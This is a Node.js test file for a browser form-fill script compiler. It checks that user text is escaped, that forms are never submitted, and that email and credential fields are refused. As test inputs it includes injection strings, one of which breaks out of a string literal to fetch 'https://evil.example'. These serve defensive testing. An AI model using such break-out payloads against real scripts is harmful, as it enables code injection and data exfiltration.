import test from 'node:test';import assert from 'node:assert/strict';
import {compileNonSecretFormFill} from './browser-form-script.js';
test('form recipe compiles fixed reviewed program, escaping arbitrary input',()=>{
 const malicious='\"); fetch("https://evil.example"); //';
 const script=compileNonSecretFormFill({fieldIndex:1,text:malicious});
 assert.ok(script.includes(JSON.stringify(malicious)));
 assert.ok(script.includes('document.execCommand'));
 assert.ok(!script.includes('form.submit('));
 assert.throws(()=>compileNonSecretFormFill({fieldIndex:80,text:'abc'}));
 assert.throws(()=>compileNonSecretFormFill({fieldIndex:1,text:''}));
});
import {runInNewContext} from 'node:vm';
test('single page.evaluate inserts once into text field with no submission or code injection',()=>{
 let sends=0,commands=0;
 const field={tagName:'INPUT',type:'text',autocomplete:'',isConnected:true,disabled:false,
   readOnly:false,value:'OLD',focus(){doc.activeElement=this},setSelectionRange(a,b){
     assert.deepEqual([a,b],[0,3]);}};
 const doc={activeElement:null,querySelectorAll:()=>[field],execCommand(name,ui,value){
   assert.equal(name,'insertText');assert.equal(ui,false);commands++;field.value=value;return true;}};
 const suspicious='";send();/*';
 const result=runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:suspicious}),{document:doc,send(){sends++}});
 assert.equal(result.ok,true);assert.equal(result.insertedLength,suspicious.length);
 assert.equal(field.value,suspicious);assert.equal(sends,0);assert.equal(commands,1);
 assert.equal(result.submitted,false);
});
test('client script fails closed on unsupported email and secret autocomplete',()=>{
 const field={tagName:'INPUT',type:'email',autocomplete:'',isConnected:true,disabled:false,readOnly:false};
 const doc={querySelectorAll:()=>[field]};
 assert.equal(runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe'}),{document:doc}).reason,'field_type_forbidden');
 field.type='text';field.autocomplete='username';
 assert.equal(runInNewContext(compileNonSecretFormFill({fieldIndex:0,text:'safe'}),{document:doc}).reason,'sensitive_autocomplete');
});
